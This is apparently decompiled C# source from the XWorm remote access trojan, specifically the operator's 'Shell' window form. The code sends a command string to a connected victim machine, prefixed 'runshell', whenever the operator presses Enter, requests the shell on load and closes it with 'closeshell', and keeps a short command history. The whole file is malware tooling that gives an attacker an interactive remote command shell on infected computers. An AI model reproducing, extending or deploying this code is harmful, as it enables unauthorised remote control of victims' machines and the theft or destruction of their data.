#define DEBUG
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Guna.UI2.WinForms;
using Microsoft.VisualBasic.CompilerServices;

namespace XWorm;

[DesignerGenerated]
public class Shell : Form
{
	private IContainer components;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Timer1")]
	private System.Windows.Forms.Timer _Timer1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Guna2TextBox1")]
	private Guna2TextBox _Guna2TextBox1;

	public GClass5 gclass5_0;

	private int int_0;

	private int int_1;

	private string[] strings_0;

	public System.Windows.Forms.Timer Timer1
	;

	public Guna2TextBox Guna2TextBox1
	;

	[field: AccessedThroughProperty("Guna2TextBox2")]
	public Guna2TextBox Guna2TextBox2
	;

	public Shell()
	{
		base.Load += Shell_Load;
		base.FormClosing += Shell_FormClosing;
		int_0 = 0;
		int_1 = 0;
		strings_0 = new string[5];
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	[System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(XWorm.Shell));
		this.Timer1 = new System.Windows.Forms.Timer(this.components);
		this.Guna2TextBox1 = new Guna.UI2.WinForms.Guna2TextBox();
		this.Guna2TextBox2 = new Guna.UI2.WinForms.Guna2TextBox();
		base.SuspendLayout();
		this.Timer1.Tick += new System.EventHandler(Timer1_Tick);
		this.Guna2TextBox1.KeyDown += new System.Windows.Forms.KeyEventHandler(Guna2TextBox1_KeyDown);
		this.Timer1.Enabled = true;
		this.Timer1.Interval = 1000;
		this.Guna2TextBox1.BorderColor = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2TextBox1.Cursor = System.Windows.Forms.Cursors.IBeam;
		this.Guna2TextBox1.DefaultText = "";
		this.Guna2TextBox1.DisabledState.BorderColor = System.Drawing.Color.FromArgb(208, 208, 208);
		this.Guna2TextBox1.DisabledState.FillColor = System.Drawing.Color.FromArgb(226, 226, 226);
		this.Guna2TextBox1.DisabledState.ForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
		this.Guna2TextBox1.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
		this.Guna2TextBox1.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.Guna2TextBox1.FocusedState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
		this.Guna2TextBox1.Font = new System.Drawing.Font("Segoe UI", 9f);
		this.Guna2TextBox1.ForeColor = System.Drawing.Color.Black;
		this.Guna2TextBox1.HoverState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
		this.Guna2TextBox1.Location = new System.Drawing.Point(0, 278);
		this.Guna2TextBox1.Name = "Guna2TextBox1";
		this.Guna2TextBox1.PasswordChar = '\0';
		this.Guna2TextBox1.PlaceholderForeColor = System.Drawing.Color.Black;
		this.Guna2TextBox1.PlaceholderText = "";
		this.Guna2TextBox1.SelectedText = "";
		this.Guna2TextBox1.Size = new System.Drawing.Size(459, 21);
		this.Guna2TextBox1.TabIndex = 50;
		this.Guna2TextBox2.BorderColor = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2TextBox2.Cursor = System.Windows.Forms.Cursors.IBeam;
		this.Guna2TextBox2.DefaultText = "";
		this.Guna2TextBox2.DisabledState.BorderColor = System.Drawing.Color.FromArgb(208, 208, 208);
		this.Guna2TextBox2.DisabledState.FillColor = System.Drawing.Color.FromArgb(226, 226, 226);
		this.Guna2TextBox2.DisabledState.ForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
		this.Guna2TextBox2.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
		this.Guna2TextBox2.Dock = System.Windows.Forms.DockStyle.Fill;
		this.Guna2TextBox2.FocusedState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
		this.Guna2TextBox2.Font = new System.Drawing.Font("Segoe UI", 9f);
		this.Guna2TextBox2.ForeColor = System.Drawing.Color.Black;
		this.Guna2TextBox2.HoverState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
		this.Guna2TextBox2.Location = new System.Drawing.Point(0, 0);
		this.Guna2TextBox2.Multiline = true;
		this.Guna2TextBox2.Name = "Guna2TextBox2";
		this.Guna2TextBox2.PasswordChar = '\0';
		this.Guna2TextBox2.PlaceholderForeColor = System.Drawing.Color.Black;
		this.Guna2TextBox2.PlaceholderText = "";
		this.Guna2TextBox2.ReadOnly = true;
		this.Guna2TextBox2.ScrollBars = System.Windows.Forms.ScrollBars.Both;
		this.Guna2TextBox2.SelectedText = "";
		this.Guna2TextBox2.Size = new System.Drawing.Size(459, 278);
		this.Guna2TextBox2.TabIndex = 51;
		base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		this.BackColor = System.Drawing.Color.White;
		base.ClientSize = new System.Drawing.Size(459, 299);
		base.Controls.Add(this.Guna2TextBox2);
		base.Controls.Add(this.Guna2TextBox1);
		base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
		base.Name = "Shell";
		this.Text = "Shell";
		base.ResumeLayout(false);
	}

	private void Shell_Load(object sender, EventArgs e)
	{
		byte[] array = Module0.smethod_6("R/");
		GClass5 gClass = gclass5_0;
		ThreadPool.QueueUserWorkItem([SpecialName][DebuggerHidden] (object a0) =>
		{
			gClass.method_1((byte[])a0);
		}, array);
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		try
		{
			if (!gclass5_0.bool_0)
			{
				Close();
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Debug.WriteLine(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void Shell_FormClosing(object sender, FormClosingEventArgs e)
	{
		byte[] array = Module0.smethod_6("closeshell");
		GClass5 gClass = gclass5_0;
		ThreadPool.QueueUserWorkItem([SpecialName][DebuggerHidden] (object a0) =>
		{
			gClass.method_1((byte[])a0);
		}, array);
	}

	private void Guna2TextBox1_KeyDown(object sender, KeyEventArgs e)
	{
		checked
		{
			switch (e.KeyCode)
			{
				case Keys.Down:
					int_0 += -1;
					if (int_0 < 0)
					{
						int_0 = 0;
					}
					Guna2TextBox1.Text = strings_0[int_0];
					break;
				case Keys.Up:
					int_0++;
					if (int_0 > strings_0.Length - 1)
					{
						int_0 = strings_0.Length - 1;
					}
					Guna2TextBox1.Text = strings_0[int_0];
					break;
				case Keys.Return:
					{
						e.SuppressKeyPress = true;
						string text = Guna2TextBox1.Text;
						if (text.Length > 0)
						{
							strings_0[int_1] = text;
							int_1++;
							if (int_1 > strings_0.Length - 1)
							{
								int_1 = 0;
							}
							byte[] array = Module0.smethod_6("runshell" + GClass19.string_0 + Guna2TextBox1.Text);
							GClass5 gClass = gclass5_0;
							ThreadPool.QueueUserWorkItem([SpecialName][DebuggerHidden] (object a0) =>
							{
								gClass.method_1((byte[])a0);
							}, array);
							if (Operators.CompareString(text, "cls", TextCompare: false) == 0)
							{
								Guna2TextBox2.Clear();
							}
							Guna2TextBox1.Clear();
						}
						break;
					}
			}
		}
	}
}